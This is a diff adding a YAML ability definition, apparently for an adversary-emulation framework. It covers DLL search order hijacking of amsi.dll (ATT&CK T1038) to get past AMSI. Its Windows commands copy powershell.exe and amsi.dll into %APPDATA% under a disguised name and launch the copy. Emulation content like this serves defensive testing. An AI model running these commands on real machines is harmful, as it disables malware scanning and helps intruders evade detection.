@@ -1,0 +1,16 @@
+---
+
+- id: tacmulti-1038-AR00-1v00-200120184608
+  name: DLL Search Order Hijacking - amsi.dll
+  description: .      Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version.      of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface).      https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/.  
+  tactic: multiple
+  technique:
+    attack_id: T1038
+    name: DLL Search Order Hijacking
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
+          copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+          cmd.exe /k %APPDATA%\updater.exe
